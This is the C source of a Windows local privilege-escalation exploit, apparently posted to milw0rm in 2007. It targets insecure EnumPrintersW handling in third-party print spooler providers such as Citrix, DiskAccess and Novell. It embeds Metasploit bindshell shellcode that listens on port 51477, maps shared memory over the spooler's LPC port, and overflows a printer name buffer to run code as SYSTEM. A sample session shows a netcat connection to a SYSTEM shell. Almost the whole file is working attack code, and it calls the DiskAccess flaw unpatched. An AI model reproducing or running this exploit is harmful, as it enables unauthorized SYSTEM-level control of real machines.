/********************Private exploit- internal use only*****************
 Title: Universal exploit for vulnerable printer providers (spooler service).
 Vulnerability: Insecure EnumPrintersW() calls
 Author: Andres Tarasco Acu�a - atarasco@514.es
 Website: http://www.514.es
 

 This code should allow to gain SYSTEM privileges with the following software:
 blink !blink! blink!

 - DiskAccess NFS Client (dapcnfsd.dll v0.6.4.0) - REPORTED & NOTFIXED -0day!!! 
 - Citrix Metaframe - cpprov.dll  - FIXED
 - Novell (nwspool.dll  - CVE-2006-5854 - untested)
 - More undisclosed stuff =)

  If this code crashes your spooler service (spoolsv.exe) check your 
  "vulnerable" printer providers at:
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Providers

  Workaround: Trust only default printer providers "Internet Print Provider" 
  and "LanMan Print Services" and delete the other ones.
 
  And remember, if it doesnt work for you, tweak it yourself. Do not ask


  D:\Programaci�n\EnumPrinters\Exploits>testlpc.exe
 [+] Citrix Presentation Server - EnumPrinterW() Universal exploit
 [+] Exploit coded by Andres Tarasco - atarasco@514.es
 

 [+] Connecting to spooler LCP port \RPC Control\spoolss
 [+] Trying to locate valid address (1 tries)
 [+] Mapped memory. Client address: 0x003d0000
 [+] Mapped memory. Server address: 0x00a70000
 [+] Targeting return address to  : 0x00A700A7
 [+] Writting to shared memory...
 [+] Written 0x1000 bytes
 [+] Exploiting vulnerability....
 [+] Exploit complete. Now Connect to 127.0.0.1:51477
 

 D:\Programaci�n\EnumPrinters>nc localhost 51477
 Microsoft Windows XP [Versi�n 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 C:\WINDOWS\system32>whoami
 NT AUTHORITY\SYSTEM


  514 ownz u
 ********************Private exploit- internal use only*****************/
#include <stdio.h>
#include <windows.h>
#include <Winspool.h>
#pragma comment(lib,"Winspool.lib")


#define REQUIRED_SIZE 0x1000
#define MAXLOOPS      10000 
unsigned char shellcode[] =
/*Just a metasploit shellcode - Bindshell 51477 */
"\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe6"
"\xc0\xc6\x10\x83\xeb\xfc\xe2\xf4\x1a\xaa\x2d\x5d\x0e\x39\x39\xef"
"\x19\xa0\x4d\x7c\xc2\xe4\x4d\x55\xda\x4b\xba\x15\x9e\xc1\x29\x9b"
"\xa9\xd8\x4d\x4f\xc6\xc1\x2d\x59\x6d\xf4\x4d\x11\x08\xf1\x06\x89"
"\x4a\x44\x06\x64\xe1\x01\x0c\x1d\xe7\x02\x2d\xe4\xdd\x94\xe2\x38"
"\x93\x25\x4d\x4f\xc2\xc1\x2d\x76\x6d\xcc\x8d\x9b\xb9\xdc\xc7\xfb"
"\xe5\xec\x4d\x99\x8a\xe4\xda\x71\x25\xf1\x1d\x74\x6d\x83\xf6\x9b"
"\xa6\xcc\x4d\x60\xfa\x6d\x4d\x50\xee\x9e\xae\x9e\xa8\xce\x2a\x40"
"\x19\x16\xa0\x43\x80\xa8\xf5\x22\x8e\xb7\xb5\x22\xb9\x94\x39\xc0"
"\x8e\x0b\x2b\xec\xdd\x90\x39\xc6\xb9\x49\x23\x76\x67\x2d\xce\x12"
"\xb3\xaa\xc4\xef\x36\xa8\x1f\x19\x13\x6d\x91\xef\x30\x93\x95\x43"
"\xb5\x93\x85\x43\xa5\x93\x39\xc0\x80\xa8\x0f\x05\x80\x93\x4f\xf1"
"\x73\xa8\x62\x0a\x96\x07\x91\xef\x30\xaa\xd6\x41\xb3\x3f\x16\x78"
"\x42\x6d\xe8\xf9\xb1\x3f\x10\x43\xb3\x3f\x16\x78\x03\x89\x40\x59"
"\xb1\x3f\x10\x40\xb2\x94\x93\xef\x36\x53\xae\xf7\x9f\x06\xbf\x47"
"\x19\x16\x93\xef\x36\xa6\xac\x74\x80\xa8\xa5\x7d\x6f\x25\xac\x40"
"\xbf\xe9\x0a\x99\x01\xaa\x82\x99\x04\xf1\x06\xe3\x4c\x3e\x84\x3d"
"\x18\x82\xea\x83\x6b\xba\xfe\xbb\x4d\x6b\xae\x62\x18\x73\xd0\xef"
"\x93\x84\x39\xc6\xbd\x97\x94\x41\xb7\x91\xac\x11\xb7\x91\x93\x41"
"\x19\x10\xae\xbd\x3f\xc5\x08\x43\x19\x16\xac\xef\x19\xf7\x39\xc0"
"\x6d\x97\x3a\x93\x22\xa4\x39\xc6\xb4\x3f\x16\x78\x16\x4a\xc2\x4f"
"\xb5\x3f\x10\xef\x36\xc0\xc6\x10";

typedef struct _UNICODE_STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING;


typedef struct LpcSectionMapInfo{
        DWORD Length;
        DWORD SectionSize;
        DWORD ServerBaseAddress;
} LPCSECTIONMAPINFO;


typedef struct LpcSectionInfo {
        DWORD Length;
        HANDLE SectionHandle;
        DWORD Param1;
        DWORD SectionSize;
        DWORD ClientBaseAddress;
        DWORD ServerBaseAddress;
} LPCSECTIONINFO;


#define SHARED_SECTION_SIZE 0x1000

typedef struct _OBJDIR_INFORMATION {
  UNICODE_STRING          ObjectName;
  UNICODE_STRING          ObjectTypeName;
  BYTE                    Data[1];
} OBJDIR_INFORMATION;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING *ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        
    PVOID SecurityQualityOfService;  
} OBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }


typedef DWORD (WINAPI *NTCREATESECTION)(
   HANDLE* SectionHandle,
   unsigned long DesiredAccess,
   OBJECT_ATTRIBUTES *ObjectAttributes,
   PLARGE_INTEGER MaximumSize,
   unsigned long PageAttributess,
   unsigned long SectionAttributes,
   HANDLE FileHandle);

typedef DWORD (WINAPI *NTCONNECTPORT)(
   HANDLE *ClientPortHandle, 
   UNICODE_STRING *ServerPortName, 
   SECURITY_QUALITY_OF_SERVICE *SecurityQos, 
   DWORD *ClientSharedMemory,
   DWORD *ServerSharedMemory,
   DWORD *MaximumMessageLength,
   DWORD *ConnectionInfo OPTIONAL, 
   DWORD *ConnectionInfoLength); 


LARGE_INTEGER ConnectToLPCPort(void){
   /* Thanks goes to Cesar Cerrudo for the WLSI paper */
	HANDLE hPort;
	LPCSECTIONINFO sectionInfo;
	LPCSECTIONMAPINFO mapInfo;
	byte ConnectDataBuffer[100];
	DWORD Size = sizeof(ConnectDataBuffer);
   WCHAR  * uString=L"\\RPC Control\\spoolss";
	DWORD i;
	UNICODE_STRING uStr;
   LARGE_INTEGER ret;
   

   NTCONNECTPORT NtConnectPort;
   NTCREATESECTION NtCreateSection;

   ret.QuadPart=0;
	for (i=0;i<100;i++)
		ConnectDataBuffer[i]=0x0;


   NtConnectPort= (NTCONNECTPORT)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtConnectPort");
   NtCreateSection= (NTCREATESECTION)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");

   if ( (!NtConnectPort) || (!NtCreateSection) ) {
      printf("[-] Error Loading functions\n");
   } else {
   	HANDLE hSection;
	   LARGE_INTEGER SecSize;
	   DWORD maxSize=0;
	   SECURITY_QUALITY_OF_SERVICE qos;
      DWORD qosSize=4;

      //create shared section	
      SecSize.LowPart=REQUIRED_SIZE;//0x1000;
	   SecSize.HighPart=0x0;

	   qos.Length =(DWORD)&qosSize;
	   qos.ImpersonationLevel =SecurityIdentification;
	   qos.ContextTrackingMode =0x01000101;
	   qos.EffectiveOnly =0x10000;
	   
	   NtCreateSection(&hSection,SECTION_ALL_ACCESS,NULL,&SecSize,PAGE_READWRITE,SEC_COMMIT ,NULL);
      
      //connect to lpc
	   memset(&sectionInfo, 0, sizeof(sectionInfo));
	   memset(&mapInfo, 0, sizeof(mapInfo));

	   sectionInfo.Length = 0x18;
	   sectionInfo.SectionHandle =hSection;
	   sectionInfo.SectionSize = SHARED_SECTION_SIZE;
	   mapInfo.Length = 0x0C;

	   uStr.Length = wcslen(uString)*2;
	   uStr.MaximumLength = wcslen(uString)*2+2;
	   uStr.Buffer =uString;
	
	   //connect to LPC port
	   if (!NtConnectPort(&hPort,&uStr,&qos,(DWORD *)&sectionInfo,(DWORD *)&mapInfo,&maxSize,(DWORD*)ConnectDataBuffer,&Size)){
         ret.LowPart=sectionInfo.ClientBaseAddress ; 
         ret.HighPart=sectionInfo.ServerBaseAddress;
      } 


   }
	return(ret);
}

#define BOFSIZE 300 //Change it if size needed more to exploit you printer provider
 
int main(int argc, char* argv[])
{
  
  unsigned char exploit[BOFSIZE];
  unsigned char buffer[REQUIRED_SIZE];
  DWORD dwSizeNeeded,n=0;
  DWORD datalen=REQUIRED_SIZE;
  LARGE_INTEGER dirs;
  HANDLE hProcess;
  DWORD write;
  char *p,i;
  #define lpLocalAddress dirs.LowPart
  #define lpTargetAddress dirs.HighPart

  printf("[+] Universal exploit for printer spooler providers\n");
  printf("[+] Some Citrix metaframe, DiskAccess and Novel versions are affected\n");
  printf("[+] Exploit by Andres Tarasco - atarasco@514.es\n\n");

  printf("[+] Connecting to spooler LCP port \\RPC Control\\spoolss\n");
  

 
  do {
   dirs=ConnectToLPCPort();
   printf("[+] Trying to locate valid address: Found 0x%8.8x after %i tries\r",lpTargetAddress,n+1);
   if (lpLocalAddress==0){ 
	 printf("\n[-] Unable to connect to spooler LPC port\n"); 
    printf("[-] Check if the service is running\n");
	 exit(0);
   }
   i=lpTargetAddress>>24; // & 0xFF000000 == 0
   n++;
   if (n==MAXLOOPS) {
      printf("\n[-] Unable to locate a valid address after %i tries\n",n);
      printf("[?] Maybe a greater REQUIRED_SIZE should help. Try increasing it\n");
      return(0);
   }
  }while (i!=0);
  
  //printf(" (%i tries)\n",n);
  printf("\n");

  printf("[+] Mapped memory. Client address: 0x%8.8x\n",lpLocalAddress);
  printf("[+] Mapped memory. Server address: 0x%8.8x\n",lpTargetAddress);

 
  i=(lpTargetAddress<<8)>>24;
  //Fill all with rets. who cares where is it.
  memset(exploit,i,sizeof(exploit)); 
  exploit[sizeof(exploit)-1]='\0';

  /*
  memset(exploit,'A',sizeof(exploit)-1);
  exploit[262]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess
  exploit[263]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess
  exploit[264]='\0';
  */
  
  printf("[+] Targeting return address to  : 0x00%2.2X00%2.2X\n",exploit[262],exploit[262]);

  p=(char *)lpLocalAddress;

  memset(&buffer[0],0x90,REQUIRED_SIZE);
  memcpy(&buffer[REQUIRED_SIZE -sizeof(shellcode)-10],shellcode,sizeof(shellcode));
  
  printf("[+] Writting to shared memory...\n");
  if ( (hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()))!= NULL ) 
  {
    if ( WriteProcessMemory( hProcess, p, &buffer[0], REQUIRED_SIZE, &write )!=0 )
    {
      printf("[+] Written 0x%x bytes \n",write);
      printf("[+] Exploiting vulnerability....\n");
      printf("[+] Exploit complete. Now try to connect to 127.0.0.1:51477\n");
      printf("[+] and check if you are system =)\n");
      EnumPrintersA ( PRINTER_ENUM_NAME, (char *)exploit, 1, NULL, 0, &dwSizeNeeded, &n );
      return(1);
    } else {
       printf("[-] Written 0x%x bytes \n",write);

    }
  } 
  printf("[-] Something failed. Error %i - Good luck next time\n",GetLastError());
  return(0);
}

// milw0rm.com [2007-01-29]
